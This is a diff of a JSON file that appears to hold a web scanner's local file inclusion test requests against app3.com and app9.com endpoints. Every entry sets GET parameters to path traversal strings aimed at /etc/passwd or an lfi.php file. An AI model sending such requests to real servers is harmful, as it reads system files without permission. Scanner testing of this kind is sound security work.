@@ -1,24 +1,57 @@
 [
   {
-    "url": "https://app9.com/index-test.php/admin/translationManager", 
-    "action": "https://app9.com/index-test.php/admin/translationManager", 
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/code.php", 
     "parameter": {
+      "lines": "../../../../../../../../../../../../../../etc/passwd", 
       "file": "../../../../../../../../../../../../../../etc/passwd"
     }, 
     "method": "get"
   }, 
   {
-    "url": "https://app9.com/index-test.php/admin/translationManager", 
-    "action": "https://app9.com/index-test.php/admin/translationManager", 
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/code.php", 
     "parameter": {
+      "lines": "../../../../../../../../../../../../../lfi.php", 
       "file": "../../../../../../../../../../../../../lfi.php"
     }, 
     "method": "get"
   }, 
   {
-    "url": "https://app9.com/index-test.php/admin/translationManager", 
-    "action": "https://app9.com/index-test.php/admin/translationManager", 
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/code.php", 
     "parameter": {
+      "lines": "../../../../../../../../../../../../../../lfi.php", 
+      "file": "../../../../../../../../../../../../../../lfi.php"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/function.php", 
+    "parameter": {
+      "start": "../../../../../../../../../../../../../../etc/passwd", 
+      "end": "../../../../../../../../../../../../../../etc/passwd", 
+      "file": "../../../../../../../../../../../../../../etc/passwd"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/function.php", 
+    "parameter": {
+      "start": "../../../../../../../../../../../../../lfi.php", 
+      "end": "../../../../../../../../../../../../../lfi.php", 
+      "file": "../../../../../../../../../../../../../lfi.php"
+    }, 
+    "method": "get"
+  }, 
+  {
+    "url": "https://app3.com", 
+    "action": "https://app3.com/windows/function.php", 
+    "parameter": {
+      "start": "../../../../../../../../../../../../../../lfi.php", 
+      "end": "../../../../../../../../../../../../../../lfi.php", 
       "file": "../../../../../../../../../../../../../../lfi.php"
     }, 
     "method": "get"
